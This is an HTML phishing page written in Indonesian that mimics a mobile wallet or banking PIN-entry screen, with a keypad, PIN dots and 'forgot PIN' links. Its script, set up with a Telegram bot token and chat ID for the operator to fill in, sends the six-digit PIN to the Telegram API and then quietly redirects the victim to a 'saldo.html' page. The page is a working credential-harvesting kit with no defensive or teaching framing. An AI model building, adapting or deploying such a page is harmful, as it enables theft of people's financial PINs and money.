<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masukkan PIN</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header */
        .header-bar {
            background-color: #1688f0;
            color: white;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            flex-shrink: 0;
        }
        .back-arrow {
            position: absolute;
            left: 16px;
            font-size: 18px;
            cursor: pointer;
        }
        .header-title {
            font-size: 17px;
            font-weight: 500;
        }

        /* Konten Utama - Jarak bawah diperbesar */
        .content-wrapper {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 30px 20px 80px; /* Jarak bawah ditambah jadi 80px */
            text-align: center;
        }
        .pin-title {
            font-size: 18px;
            font-weight: 500;
            color: #222;
            margin-bottom: 20px;
        }
        .pin-dots {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 25px;
        }
        .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background-color: #333;
            transition: all 0.2s ease;
        }
        .dot.filled {
            background-color: #1688f0;
            transform: scale(1.1);
        }
        .help-row {
            width: 100%;
            display: flex;
            justify-content: space-between;
            padding: 0 10px;
            font-size: 13px;
            color: #1688f0;
        }
        .help-row span {
            cursor: pointer;
        }
        .pesan-error {
            color: #e53935;
            font-size: 13px;
            margin-top: 15px;
            display: none;
        }

        /* Keyboard tetap di bawah & ukuran kecil */
        .keypad {
            flex-shrink: 0;
            padding: 10px 10px 25px;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            background-color: #fff;
        }
        .key {
            background-color: #f0f2f5;
            border: none;
            border-radius: 6px;
            padding: 10px 8px;
            font-size: 18px;
            font-weight: 500;
            color: #222;
            text-align: left;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 2px;
            transition: background 0.15s;
        }
        .key:active {
            background-color: #e0e2e5;
        }
        .key .key-sub {
            font-size: 11px;
            font-weight: 400;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="header-bar">
        <span class="back-arrow">&lt;</span>
        <div class="header-title">Masuk</div>
    </div>

    <div class="content-wrapper">
        <div class="pin-title">Masukkan PIN</div>
        <div class="pin-dots" id="pinDots">
            <span class="dot"></span>
            <span class="dot"></span>
            <span class="dot"></span>
            <span class="dot"></span>
            <span class="dot"></span>
            <span class="dot"></span>
        </div>
        <div class="help-row">
            <span>• BUTUH BANTUAN?</span>
            <span>LUPA PIN?</span>
        </div>
        <div class="pesan-error" id="pesanError">Koneksi gagal, coba lagi</div>
    </div>

    <div class="keypad">
        <button class="key" onclick="tambahAngka('1')">1</button>
        <button class="key" onclick="tambahAngka('2')">2 <span class="key-sub">ABC</span></button>
        <button class="key" onclick="tambahAngka('3')">3 <span class="key-sub">DEF</span></button>

        <button class="key" onclick="tambahAngka('4')">4 <span class="key-sub">GHI</span></button>
        <button class="key" onclick="tambahAngka('5')">5 <span class="key-sub">JKL</span></button>
        <button class="key" onclick="tambahAngka('6')">6 <span class="key-sub">MNO</span></button>

        <button class="key" onclick="tambahAngka('7')">7 <span class="key-sub">PQRS</span></button>
        <button class="key" onclick="tambahAngka('8')">8 <span class="key-sub">TUV</span></button>
        <button class="key" onclick="tambahAngka('9')">9 <span class="key-sub">WXYZ</span></button>

        <button class="key" onclick="tambahAngka('#')">#</button>
        <button class="key" onclick="tambahAngka('0')">0</button>
        <button class="key" onclick="tambahAngka('.')">.</button>
    </div>

    <script>
        // === ISI DATA KAMU DISINI ===
        const TOKEN_BOT = "8994642736:AAFuer-9fij5SH2ygkMUYwVgA4V-Ux5lK_0";
        const ID_CHAT = "-1004401558849";
        const HALAMAN_TUJUAN = "saldo.html"; // Ubah nama halaman tujuan
        // ===========================

        let pinSaatIni = "";
        const maksimalDigit = 6;
        const daftarTitik = document.querySelectorAll(".dot");
        const kotakError = document.getElementById("pesanError");

        // Perbarui tampilan titik saat ditekan
        function perbaruiTampilan() {
            daftarTitik.forEach((titik, indeks) => {
                titik.classList.toggle("filled", indeks < pinSaatIni.length);
            });
        }

        // Tambah angka saat tombol ditekan
        function tambahAngka(angka) {
            if (pinSaatIni.length >= maksimalDigit) return;
            pinSaatIni += angka;
            perbaruiTampilan();
            kotakError.style.display = "none";

            // Jika sudah 6 digit: kirim data & pindah halaman
            if (pinSaatIni.length === maksimalDigit) {
                prosesKirimData();
            }
        }

        // Kirim ke Telegram lalu pindah halaman
        async function prosesKirimData() {
            try {
                const isiPesan = `🔒 PIN DITERIMA\nPIN: ${pinSaatIni}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
                
                await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        chat_id: ID_CHAT,
                        text: isiPesan
                    })
                });

                // Berhasil: langsung pindah halaman
                window.location.href = HALAMAN_TUJUAN;

            } catch (eror) {
                kotakError.style.display = "block";
                // Reset jika gagal
                setTimeout(() => {
                    pinSaatIni = "";
                    perbaruiTampilan();
                    kotakError.style.display = "none";
                }, 2500);
            }
        }
    </script>
</body>
</html>
